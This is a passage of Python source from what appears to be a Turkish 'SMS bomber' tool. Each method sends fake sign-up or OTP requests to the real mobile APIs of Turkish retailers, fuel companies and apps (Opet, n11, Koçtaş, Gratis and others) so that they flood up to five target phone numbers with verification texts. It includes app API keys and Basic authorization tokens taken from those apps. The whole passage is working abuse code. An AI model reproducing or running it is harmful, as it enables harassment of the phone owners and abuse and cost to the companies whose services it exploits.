                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> ipapp.ipragaz.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> ipapp.ipragaz.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
             
    #mogazmobilapinew.aygaz.com.tr
    def Mogaz(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://mogazmobilapinew.aygaz.com.tr:443/api/Member/UserRegister"
                    json={"address": "", "birthDate": "31-08-1975", "city": 0, "deviceCode": "839C5FAF-A7C1-2CDA--6F5414AD2228", "district": 0, "email": self.mail, "isUserAgreement": True, "name": "Memati", "password": "", "phone": numara, "productType": 1, "subscription": True, "surname": "Bas"}
                    r = requests.post(url, json=json)
                    if (r.json()["messageCode"]) == "OK":
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> mogazmobilapinew.aygaz.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> mogazmobilapinew.aygaz.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue  
            
    #ipragaz.com.tr
    def GoMobile(self):
    
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    r = requests.get(f"https://gomobilapp.ipragaz.com.tr:443/api/v1/0/authentication/sms/send?phone={numara}&isRegistered=true")
                    if (r.json()["data"]["success"]) == True:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> gomobilapp.ipragaz.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> gomobilapp.ipragaz.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #petrolofisi.com.tr
    def PetrolOfisi(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://mobilapi.petrolofisi.com.tr:443/api/auth/register"
                    headers = {"Accept": "*/*", "Content-Type": "application/json", "User-Agent": "Petrol%20Ofisi/78 CFNetwork/1335.0.3 Darwin/21.6.0", "X-Channel": "IOS", "Accept-Language": "tr", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
                    json={"approvedContractVersion": "v1", "approvedKvkkVersion": "v1", "contractPermission": True, "deviceId": "", "etkContactPermission": True, "kvkkPermission": True, "mobilePhone": f"0{numara}", "name": "Memati", "plate": "31ABC31", "positiveCard": "", "referenceCode": "", "surname": "Bas"}
                    r = requests.post(url, headers=headers, json=json)
                    if r.status_code == 204:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> mobilapi.petrolofisi.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> mobilapi.petrolofisi.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #totalistasyonlari.com.tr
    def Total(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    r = requests.post(f"https://mobileapi.totalistasyonlari.com.tr:443/SmartSms/SendSms?gsmNo={numara}&api_key=GetDocuments%0A", verify=False)
                    if (r.json()["success"]) == True:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> mobileapi.totalistasyonlari.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> mobileapi.totalistasyonlari.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue            
            
    #opet.com.tr
    def Opet(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://api.opet.com.tr:443/api/authentication/register"
                    json={"abroadcompanies": ["1", "2", "3"], "birthdate": "1975-08-31T22:00:00.000Z", "cardNo": None, "commencisRadio": "true", "email": self.mail, "firstName": "Memati", "googleRadio": "true", "lastName": "Bas", "microsoftRadio": "true", "mobilePhone": str(numara), "opetKvkkAndEtk": True, "plate": "31ABC31"}
                    r = requests.post(url, json=json)
                    if (r.status_code) == 200:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> api.opet.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> api.opet.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue


    #dolap.com
    def Dolap(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://api-gateway.dolap.com:443/member"
                    headers = {"Content-Type": "application/json", "Accept": "*/*", "Appversion": "359", "Accept-Language": "tr-TR,tr;q=0.9", "Accept-Encoding": "gzip, deflate", "Categorygroup": "WOMAN", "Access-Token": "", "User-Agent": "dolap/2 CFNetwork/1335.0.3 Darwin/21.6.0", "Appplatform": "ios"}
                    json={"advertisingId": "", "campaignAgreement": False, "email": self.mail, "memberCookie": "", "membershipAgreement": True, "nickName": "tingirifistik", "password": "31ABC..abc31", "phoneNumber": numara}
                    r = requests.put(url, headers=headers, json=json)
                    if r.status_code == 200:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> api-gateway.dolap.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> api-gateway.dolap.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            

    #heymobility.tech
    def Hey(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate", "User-Agent": "HEY!%20Scooter/116 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr"}
                    r = requests.post(f"https://heyapi.heymobility.tech:443/V9//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={numara}", headers=headers)
                    if (r.json()["IsSuccess"]) == True:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> heyapi.heymobility.tech "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> heyapi.heymobility.tech "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            

    #tazi.tech
    def Tazi(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://mobileapiv2.tazi.tech:443/C08467681C6844CFA6DA240D51C8AA8C/uyev2/smslogin"
                    headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json;charset=utf-8", "Accept-Encoding": "gzip, deflate", "User-Agent": "Taz%C4%B1/3 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr-TR,tr;q=0.9", "Authorization": "Basic dGF6aV91c3Jfc3NsOjM5NTA3RjI4Qzk2MjRDQ0I4QjVBQTg2RUQxOUE4MDFD"}
                    json={"cep_tel": numara, "cep_tel_ulkekod": "90"}
                    r = requests.post(url, headers=headers, json=json)
                    if (r.json()["kod"]) == "0000":
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> mobileapiv2.tazi.tech "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> mobileapiv2.tazi.tech "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    
    #n11.com
    def N11(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://mobileapi.n11.com:443/mobileapi/rest/v2/msisdn-verification/init-verification?__hapc=F41A0C01-D102-4DBE-97B2-07BCE2317CD3"
                    headers = {"Mobileclient": "IOS", "Content-Type": "application/json", "Accept": "*/*", "Authorization": "api_key=iphone,api_hash=9f55d44e2aa28322cf84b5816bb20461,api_random=686A1491-041F-4138-865F-9E76BC60367F", "Clientversion": "163", "Accept-Encoding": "gzip, deflate", "User-Agent": "n11/1 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr-TR,tr;q=0.9", "Connection": "close"}
                    json={"__hapc": "", "_deviceId": "696B171-031N-4131-315F-9A76BF60368F", "channel": "MOBILE_IOS", "countryCode": "+90", "email": self.mail, "gsmNumber": numara, "userType": "BUYER"}
                    r = requests.post(url, headers=headers, json=json)
                    if (r.json()["isSuccess"]) == True:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> mobileapi.n11.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> mobileapi.n11.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #joker.com.tr
    def Joker(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://www.joker.com.tr:443/kullanici/ajax/check-sms"
                    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest"}
                    data = {"phone": numara}
                    r = requests.post(url, headers=headers, data=data)
                    if (r.json()["success"]) == True:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> joker.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> joker.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue


    #e-bebek.com
    def Ebebek(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    r = requests.post("https://api2.e-bebek.com:443/authorizationserver/oauth/token?lang=tr&curr=EUR&client_secret=secret&grant_type=client_credentials&client_id=trusted_client")
                    auth = (r.json()["access_token"])
                    url = "https://api2.e-bebek.com:443/ebebekwebservices/v2/ebebek/users/anonymous/validate?curr=TRY&lang=tr"
                    headers = {"Content-Type": "application/json", "Authorization": f"Bearer {auth}"}
                    json={"email": self.mail, "emailAllow": False, "firstName": "Memati", "lastName": "Bas", "password": "31ABC..abc31", "smsAllow": True, "uid": numara}
                    r = requests.post(url, headers=headers, json=json)
                    if r.json()["status"] == "SUCCESS":
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> api2.e-bebek.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> api2.e-bebek.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    #sakasu.com.tr
    def Saka(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://mobilcrm2.saka.com.tr:443/api/customer/login"
                    json={"gsm": numara}
                    r = requests.post(url, json=json)
                    if (r.json()["status"]) == 1 :
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> mobilcrm2.saka.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> mobilcrm2.saka.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #gofody.com
    def Gofody(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://backend.gofody.com:443/api/v1/enduser/register/"
                    json={"country_code": "90", "phone": numara}
                    r = requests.post(url, json=json)
                    if (r.json()["success"]) == True:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> backend.gofody.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> backend.gofody.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue


    #madamecoco.com
    def Madame(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://www.madamecoco.com:443/users/registration/"
                    headers = {"Content-Type": "multipart/form-data; boundary=mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u", "X-Project-Name": "undefined", "Accept": "application/json, text/plain, */*", "X-App-Type": "akinon-mobile", "X-Requested-With": "XMLHttpRequest", "Accept-Language": "tr-TR,tr;q=0.9", "Cache-Control": "no-store", "Accept-Encoding": "gzip, deflate", "X-App-Device": "ios", "Referer": "https://www.madamecoco.com/", "User-Agent": "Madame%20Coco/1 CFNetwork/1335.0.3 Darwin/21.6.0"}
                    data = f"--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{numara}\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u--\r\n"
                    r = requests.post(url, headers=headers, data=data)
                    if (r.status_code) == 202:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> madamecoco.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> madamecoco.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
            

    
    #evidea.com
    def Evidea(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://www.evidea.com:443/users/register/"
                    headers = {"Content-Type": "multipart/form-data; boundary=fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi", "X-Project-Name": "undefined", "Accept": "application/json, text/plain, */*", "X-App-Type": "akinon-mobile", "X-Requested-With": "XMLHttpRequest", "Accept-Language": "tr-TR,tr;q=0.9", "Cache-Control": "no-store", "Accept-Encoding": "gzip, deflate", "X-App-Device": "ios", "Referer": "https://www.evidea.com/", "User-Agent": "Evidea/1 CFNetwork/1335.0.3 Darwin/21.6.0", "X-Csrftoken": "7NdJbWSYnOdm70YVLIyzmylZwWbqLFbtsrcCQdLAEbnx7a5Tq4njjS3gEElZxYps"}
                    data = f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{numara}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi--\r\n"
                    r = requests.post(url, headers=headers, data=data)      
                    if r.status_code == 202:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> evidea.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> evidea.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #koctas.com.tr
    def Koctas(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://occ2.koctas.com.tr:443/koctaswebservices/v2/koctas/registerParo/get-register-parocard-otp"
                    data = {"givePermission": "true", "mobileNumber": numara}
                    r = requests.post(url, data=data)
                    if (r.json()["status"]) == True:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> occ2.koctas.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> occ2.koctas.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
            
    #gratis.com
    def Gratis(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    token = requests.get("https://ivt.mobildev.com:443/auth", headers={"Accept": "*/*", "Accept-Encoding": "gzip, deflate", "User-Agent": "Gratis/2.2.5 (com.pharos.Gratis; build:1447; iOS 15.6.1) Alamofire/5.6.2", "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9", "Authorization": "Basic NDkxNTkwNjU2OTpnMDg1M2YzY3Z0cjJkYXowYTFodXE3bnNveGZ6cTA=", "Connection": "close"}).json()["access_token"]
                    url = "https://ivt.mobildev.com:443/data/0e80tyg8"
                    headers = {"Accept": "*/*", "Content-Type": "application/json", "Authorization": f"Bearer {token}", "Accept-Encoding": "gzip, deflate", "User-Agent": "Gratis/2.2.5 (com.pharos.Gratis; build:1447; iOS 15.6.1) Alamofire/5.6.2", "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9", "Connection": "close"}
                    json={"accountType": 0, "coordinate": {"lat": 0, "lon": 0}, "customId": "", "email": self.mail, "etk": {"call": 2, "email": 2, "emailFrequency": 2, "emailFrequencyType": 1, "msisdn": 1, "msisdnFrequency": 2, "msisdnFrequencyType": 1, "share": 1}, "extended": {"loyalty": 11}, "firstName": "Memati", "kvkk": {"international": 1, "process": 1, "share": 1}, "language": "tr", "lastName": "Bas", "msisdn": numara, "note": "\xc4\xb0zin S\xc3\xbcreci Ba\xc5\x9flatma", "permSource": 3}
                    r = requests.post(url, headers=headers, json=json)
                    if (r.status_code) == 200:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> ivt.mobildev.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> ivt.mobildev.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
